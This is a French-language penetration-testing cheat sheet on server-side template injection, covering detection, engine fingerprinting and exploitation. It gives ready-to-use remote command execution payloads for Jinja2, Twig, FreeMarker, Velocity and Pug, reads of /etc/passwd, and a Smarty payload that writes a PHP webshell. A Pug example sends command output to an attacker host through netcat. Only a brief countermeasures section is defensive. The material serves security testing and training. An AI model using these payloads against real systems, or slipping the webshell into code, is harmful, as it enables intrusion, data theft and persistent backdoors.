# SSTI

> Basé sur PortSwigger Research (BlackHat 2015 – SSTI) + PayloadsAllTheThings – SSTI.  
> ⚡ Vulnérabilité critique → souvent mène à RCE.

## Détection

- Tester opérations arithmétiques simples dans l’entrée :  
  - `{{7*7}}` → `49` (Jinja2, Twig…)  
  - `${7*7}` → `49` (Freemarker, JSP EL, Velocity…)  
  - `<%= 7*7 %>` (ERB, JSP)  
  - `#{7*7}` (Ruby ERB, Groovy GSP)  
- Indices → si sortie contient une **erreur serveur** ou un résultat numérique inattendu.  

## Identification du moteur

- Payload discriminants :  
  - `{{7*'7'}}`  
    - Twig → `49`  
    - Jinja2 → `7777777`  
    - Erreur sinon.  
- Erreurs verboses révèlent souvent le moteur (Twig, Velocity, Smarty…).  

## Exploitation par moteur

### Python (Jinja2)
- RCE :  
  - `{{ cycler.__init__.__globals__.os.popen('id').read() }}`  
  - `{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}`  

### PHP – Smarty
- Lire fichier :  
  - `{self::getStreamVariable("file:///etc/passwd")}`  
- Webshell :  
  - `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}`  

### PHP – Twig
- RCE via filtre :  
  - `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`  
- Sandbox bypass :  
  - `{{_self.displayBlock("id",[],{"id":[userObject,"vulnerableMethod"]})}}`  

### Java – FreeMarker
- Exécution :  
  - `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }`  

### Java – Velocity
- RCE via Runtime.exec :  
  - `$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor()`
- Sortie commande :  
```
  #set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
  $ex.waitFor()
  #set($out=$ex.getInputStream())
  #foreach($i in [1..$out.available()])
  $str.valueOf($chr.toChars($out.read()))
  #end
```
### Node.js – Jade / Pug
- Exécution :  
  - `var x = root.process.mainModule.require`
  - `var cp = x('child_process')`
  - `= cp.exec('id | nc attacker.net 80')`
    
## Payloads génériques (PayloadsAllTheThings)

- **Tests universels** :
- `{{7*7}}`
- `${7*7}`
- `<%= 7*7 %>`
- `#{7*7}`

- **Read sensitive files** :
- `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}` (Jinja2)

- **RCE** :
- `{{ ''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['os'].popen('id').read() }}`

- **Bypass sandbox** :
- `{{ self }}` (Twig)
- `${class.getClassLoader()}` (Java EL)

## Méthodo (résumé)

1. **Detect** → injecter `{{7*7}}`, `${7*7}`, etc.  
2. **Identify** → différences de résultats / erreurs.  
3. **Explore** → chercher objets internes (`self`, `_context`, `class`, `Runtime`, `os`).  
4. **Exploit** → exécution commandes / file read / backdoor.  

## Résumé payloads prêts à l’emploi

- Twig → `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`  
- Jinja2 → `{{ cycler.__init__.__globals__.os.popen('id').read() }}`  
- Smarty → `{self::getStreamVariable("file:///etc/passwd")}`  
- FreeMarker → `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }`  
- Velocity → `$class.inspect("java.lang.Runtime").type.getRuntime().exec("id").waitFor()`  
- Jade → `= root.process.mainModule.require('child_process').exec('id')`
  
## Contremesures

- Utiliser moteurs **logic-less** (Mustache, Handlebars).  
- Ne jamais concaténer directement l’input → passer comme variable.  
- Si obligatoire → sandbox stricte + exécution isolée (container/jail).  

## Références

- PortSwigger Web Security Academy – *Server Side Template Injection*  
- James Kettle, BlackHat 2015 – *Server-Side Template Injection*  
- [PayloadsAllTheThings – *SSTI*](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
